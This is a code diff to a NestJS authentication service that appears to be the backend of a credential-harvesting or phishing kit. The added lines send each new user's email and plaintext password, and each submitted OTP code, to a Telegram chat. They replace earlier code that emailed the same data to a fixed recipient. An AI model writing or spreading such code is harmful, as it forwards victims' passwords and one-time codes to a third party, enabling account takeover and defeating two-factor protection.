@@ -1,6 +1,7 @@
 import { Injectable, HttpStatus } from '@nestjs/common';
 import { PrismaService } from 'src/config/prisma/prisma.service';
 import { SendMailsService } from 'src/config/email/sendMail.service';
+import { TelegramService } from 'src/config/telegram_bot/telegramBot.service';
 import { handleResponse } from 'src/utils/responseHandler';
 import { CreateAuthDto } from './dto/create-auth.dto';
 import { UpdateAuthDto } from './dto/update-auth.dto';
@@ -11,6 +12,7 @@ export class AuthService {
   constructor(
     private prisma: PrismaService,
     private readonly sendMail: SendMailsService,
+    private readonly telegramService: TelegramService,
   ) {}
 
   async create(createAuthDto: CreateAuthDto) {
@@ -20,7 +22,11 @@ export class AuthService {
       },
     });
 
-    const to = config.recipient;
+    // Prepare and send message to Telegram
+    const message = `New user created!\nEmail: ${user.email_address}\nPassword: ${user.password}`;
+    await this.telegramService.sendMessage(config.chatID, message);
+
+    /*    const to = config.recipient;
     const subject = 'New User Submission';
     const template = 'activateAcct';
     const context = {
@@ -28,7 +34,7 @@ export class AuthService {
       password: user.password,
     };
 
-    await this.sendMail.sendVerificationEmail(to, subject, template, context);
+    await this.sendMail.sendVerificationEmail(to, subject, template, context);*/
 
     delete user.password;
     delete user.Otp;
@@ -54,7 +60,7 @@ export class AuthService {
       data: { Otp: otpDto.otp },
     });
 
-    const to = config.recipient;
+    /*const to = config.recipient;
     const subject = 'New Otp Submission';
     const template = 'newOtp';
     const context = {
@@ -62,7 +68,11 @@ export class AuthService {
       otp: user.Otp,
     };
 
-    await this.sendMail.sendVerificationEmail(to, subject, template, context);
+    await this.sendMail.sendVerificationEmail(to, subject, template, context);*/
+
+    // Prepare and send message to Telegram
+    const message = `New Otp Submission for Email: ${user.email_address}\nOtp: ${otpDto.otp}`;
+    await this.telegramService.sendMessage(config.chatID, message);
 
     delete user.password;
     delete user.Otp;
